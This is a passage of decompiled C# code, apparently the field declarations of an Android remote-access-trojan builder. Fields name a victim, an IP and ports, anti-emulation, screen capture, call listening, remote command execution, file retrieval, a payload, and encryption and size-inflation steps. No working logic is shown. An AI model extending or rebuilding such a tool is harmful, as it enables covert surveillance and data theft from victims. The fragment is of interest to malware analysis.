	// Token: 0x040001BC RID: 444
	private string ANTIEMO;

	// Token: 0x040001BD RID: 445
	private string APKVERSION;

	// Token: 0x040001BE RID: 446
	private string NOTIFI_MSG;

	// Token: 0x040001BF RID: 447
	private string NOTIFI_TITLE;

	// Token: 0x040001C0 RID: 448
	private string HIDETYPE;

	// Token: 0x040001C1 RID: 449
	private string TheTarget;

	// Token: 0x040001C2 RID: 450
	private string UseRecorder;

	// Token: 0x040001C3 RID: 451
	private int NewFakeSize;

	// Token: 0x040001C4 RID: 452
	private int _Time;

	// Token: 0x040001C5 RID: 453
	private Bitmap _Bitmap_ICO;

	// Token: 0x040001C6 RID: 454
	private int cou;

	// Token: 0x040001C7 RID: 455
	private string ip;

	// Token: 0x040001C8 RID: 456
	private string ports;

	// Token: 0x040001C9 RID: 457
	private string namevictim;

	// Token: 0x040001CA RID: 458
	private string namepatch;

	// Token: 0x040001CB RID: 459
	private string version;

	// Token: 0x040001CC RID: 460
	private string proprty;

	// Token: 0x040001CD RID: 461
	private string sleepms;

	// Token: 0x040001CE RID: 462
	private string futex;

	// Token: 0x040001CF RID: 463
	private string flavor;

	// Token: 0x040001D0 RID: 464
	private string folder_building;

	// Token: 0x040001D1 RID: 465
	private string folder_apktool;

	// Token: 0x040001D2 RID: 466
	private string path_apktool;

	// Token: 0x040001D3 RID: 467
	private string path_font;

	// Token: 0x040001D4 RID: 468
	private string xPackage;

	// Token: 0x040001D5 RID: 469
	private string[] ftx;

	// Token: 0x040001D6 RID: 470
	private int vulTrack;

	// Token: 0x040001D7 RID: 471
	private string pack1;

	// Token: 0x040001D8 RID: 472
	private string pack2;

	// Token: 0x040001D9 RID: 473
	private const string stub7 = "stub7";

	// Token: 0x040001DA RID: 474
	private string Nactivz;

	// Token: 0x040001DB RID: 475
	private string Nbrodatz;

	// Token: 0x040001DC RID: 476
	private string Nservziz;

	// Token: 0x040001DD RID: 477
	private string Ntolziz;

	// Token: 0x040001DE RID: 478
	private const string ClassGen1 = "ClassGen1";

	// Token: 0x040001DF RID: 479
	private const string ClassGen3 = "ClassGen3";

	// Token: 0x040001E0 RID: 480
	private const string ClassGen5 = "ClassGen5";

	// Token: 0x040001E1 RID: 481
	private const string ClassGen8 = "ClassGen8";

	// Token: 0x040001E2 RID: 482
	private const string ClassGen10 = "ClassGen10";

	// Token: 0x040001E3 RID: 483
	private const string ClassGen12 = "ClassGen12";

	// Token: 0x040001E4 RID: 484
	private const string ClassGen14 = "ClassGen14";

	// Token: 0x040001E5 RID: 485
	private string NRequestPermissions;

	// Token: 0x040001E6 RID: 486
	private string N_trns_g_;

	// Token: 0x040001E7 RID: 487
	private string NStartScreenCap;

	// Token: 0x040001E8 RID: 488
	private string NRequestAccess;

	// Token: 0x040001E9 RID: 489
	private string NHandelScreenCap;

	// Token: 0x040001EA RID: 490
	private string N_news_g_;

	// Token: 0x040001EB RID: 491
	private string N_strt_view_;

	// Token: 0x040001EC RID: 492
	private string N_sc_fb_;

	// Token: 0x040001ED RID: 493
	private string NRequestDraw;

	// Token: 0x040001EE RID: 494
	private string NRequestBattery;

	// Token: 0x040001EF RID: 495
	private string N_engine_wrk_;

	// Token: 0x040001F0 RID: 496
	private string N_skin_cls_;

	// Token: 0x040001F1 RID: 497
	private string N_update_app_;

	// Token: 0x040001F2 RID: 498
	private string N_callr_lsnr_;

	// Token: 0x040001F3 RID: 499
	private string N_clss_loder_;

	// Token: 0x040001F4 RID: 500
	private string N_excut_meth_;

	// Token: 0x040001F5 RID: 501
	private string N_run_comnd_;

	// Token: 0x040001F6 RID: 502
	private string N_get_me_fil_;

	// Token: 0x040001F7 RID: 503
	private string NCommandsService;

	// Token: 0x040001F8 RID: 504
	private string NClassGen0;

	// Token: 0x040001F9 RID: 505
	private string NClassGen1;

	// Token: 0x040001FA RID: 506
	private string NClassGen2;

	// Token: 0x040001FB RID: 507
	private string NClassGen3;

	// Token: 0x040001FC RID: 508
	private string NClassGen4;

	// Token: 0x040001FD RID: 509
	private string NClassGen5;

	// Token: 0x040001FE RID: 510
	private string NClassGen6;

	// Token: 0x040001FF RID: 511
	private string NClassGen8;

	// Token: 0x04000200 RID: 512
	private string NClassGen9;

	// Token: 0x04000201 RID: 513
	private string NClassGen10;

	// Token: 0x04000202 RID: 514
	private string NClassGen11;

	// Token: 0x04000203 RID: 515
	private string NClassGen12;

	// Token: 0x04000204 RID: 516
	private string NClassGen13;

	// Token: 0x04000205 RID: 517
	private string NClassGen14;

	// Token: 0x04000206 RID: 518
	private string payload;

	// Token: 0x04000207 RID: 519
	private const string resoString1 = "c1c2c3c4c5c6";

	// Token: 0x04000208 RID: 520
	private const string resoString3 = "f1f2f3f4f5f6";

	// Token: 0x04000209 RID: 521
	private const string resoString5 = "t1t2t3t4t5t6";

	// Token: 0x0400020A RID: 522
	private const string resoString7 = "i1i2i3i4i5i6";

	// Token: 0x0400020B RID: 523
	private const string resoString9 = "o1o2o3o4o5o6";

	// Token: 0x0400020C RID: 524
	private const string resoString11 = "e1e2e3e4e5e6";

	// Token: 0x0400020D RID: 525
	private string NresoString0;

	// Token: 0x0400020E RID: 526
	private string NresoString1;

	// Token: 0x0400020F RID: 527
	private string NresoString2;

	// Token: 0x04000210 RID: 528
	private string NresoString3;

	// Token: 0x04000211 RID: 529
	private string NresoString4;

	// Token: 0x04000212 RID: 530
	private string NresoString5;

	// Token: 0x04000213 RID: 531
	private string NresoString6;

	// Token: 0x04000214 RID: 532
	private string NresoString7;

	// Token: 0x04000215 RID: 533
	private string NresoString8;

	// Token: 0x04000216 RID: 534
	private string NresoString9;

	// Token: 0x04000217 RID: 535
	private string NresoString10;

	// Token: 0x04000218 RID: 536
	private string NresoString11;

	// Token: 0x04000219 RID: 537
	private string NresoString12;

	// Token: 0x0400021A RID: 538
	private string Napp_reso0;

	// Token: 0x0400021B RID: 539
	private const string draw_notifi = "x1x2x3x4x5x6";

	// Token: 0x0400021C RID: 540
	private string Ndraw_ico;

	// Token: 0x0400021D RID: 541
	private string Ndraw_notifi;

	// Token: 0x0400021E RID: 542
	private string NwebXML;

	// Token: 0x0400021F RID: 543
	private string NnotifiXML;

	// Token: 0x04000220 RID: 544
	private string new_exit_mth;

	// Token: 0x04000221 RID: 545
	private string new_wifipolc;

	// Token: 0x04000222 RID: 546
	private string new_formatpacket;

	// Token: 0x04000223 RID: 547
	private string new_dzip;

	// Token: 0x04000224 RID: 548
	private string new_getbyte;

	// Token: 0x04000225 RID: 549
	private string new_base_mth;

	// Token: 0x04000226 RID: 550
	private string new_getstr;

	// Token: 0x04000227 RID: 551
	private string new_czip;

	// Token: 0x04000228 RID: 552
	private string new_inst;

	// Token: 0x04000229 RID: 553
	private string new_strt_con_;

	// Token: 0x0400022A RID: 554
	private string new_fist_inf_;

	// Token: 0x0400022B RID: 555
	private string new_new_con_;

	// Token: 0x0400022C RID: 556
	private string new_send_it_;

	// Token: 0x0400022D RID: 557
	private string new_Reblace_;

	// Token: 0x0400022E RID: 558
	private string new_runn_srv_;

	// Token: 0x0400022F RID: 559
	private string NEWRANDOM;

	// Token: 0x04000230 RID: 560
	public Random rshit;

	// Token: 0x04000231 RID: 561
	private string KEY;

	// Token: 0x04000232 RID: 562
	public bool oncedelete;

	// Token: 0x04000233 RID: 563
	private bool FolderApk;

	// Token: 0x04000234 RID: 564
	private bool Builtapk;

	// Token: 0x04000235 RID: 565
	private bool StartedZip;

	// Token: 0x04000236 RID: 566
	private bool encrypt_started;

	// Token: 0x04000237 RID: 567
	private bool protectfinished;

	// Token: 0x04000238 RID: 568
	public bool pumpstarted;

	// Token: 0x04000239 RID: 569
	public bool pumpfinished;

	// Token: 0x0400023A RID: 570
	public bool firstpump;

	// Token: 0x0400023B RID: 571
	private bool Once;

	// Token: 0x0400023D RID: 573
	private object CMD;

	// Token: 0x0400023E RID: 574
	private string[] randmid;

	// Token: 0x0400023F RID: 575
	private Random rnd;

	// Token: 0x04000240 RID: 576
	private Random numberrandomer;

	// Token: 0x04000241 RID: 577
	private List<Rectangle> RectInputText0;

	// Token: 0x04000242 RID: 578
	private List<Rectangle> RectInputText1;

	// Token: 0x04000243 RID: 579
	private List<Rectangle> RectInputText3;

	// Token: 0x04000244 RID: 580
	private Random _0024STATIC_0024MoveRandomFile_00242021EE_0024r;

	// Token: 0x04000245 RID: 581
	private StaticLocalInitFlag _0024STATIC_0024MoveRandomFile_00242021EE_0024r_0024Init;

	// Token: 0x04000246 RID: 582
	private Random _0024STATIC_0024MoveRandomDIR_00242021EE_0024r;

	// Token: 0x04000247 RID: 583
	private StaticLocalInitFlag _0024STATIC_0024MoveRandomDIR_00242021EE_0024r_0024Init;

	// Token: 0x02000039 RID: 57
	// (Invoke) Token: 0x06000285 RID: 645
	public delegate void Delegate0(object d0, object b0);
}
